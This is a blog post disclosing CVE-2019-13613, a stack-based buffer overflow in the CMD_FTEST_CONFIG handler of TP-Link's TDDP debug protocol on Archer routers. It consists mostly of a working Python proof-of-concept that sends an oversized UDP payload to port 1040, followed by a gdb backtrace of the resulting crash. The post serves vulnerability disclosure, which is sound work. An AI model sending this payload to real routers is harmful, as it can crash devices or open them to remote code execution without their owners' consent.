---
layout: post
title: "[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow"
excerpt: "A debug protocol overflow."
modified: 2019-07-15
categories: proof-of-concept
tags: ["tp-link"]
comments: true
---

[^1]: <https://mjg59.dreamwidth.org/51672.html?thread=1916120>

# Overview
CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server. [^1]

# Proof-of-Concept
{% highlight python %}
#!/usr/bin/python3

# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0

import sys
import binascii
import socket

rhost = "target_ip"
payload = "A" * 259 + "BBBBCCCC"

port_send = 1040

tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = "%s;junk" % payload
packet = packet + argument.encode()
sock_send.sendto(packet, (rhost, port_send))
sock_send.close()
{% endhighlight %}

# Crash Analysis
{% highlight bash %}
#0  0xff7277a8 in strnlen () from /lib/libc.so.0
#1  0xff722050 in _vfprintf_internal () from /lib/libc.so.0
#2  0xff71f3c8 in vsnprintf () from /lib/libc.so.0
#3  0x000092cc in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
{% endhighlight %}

# References
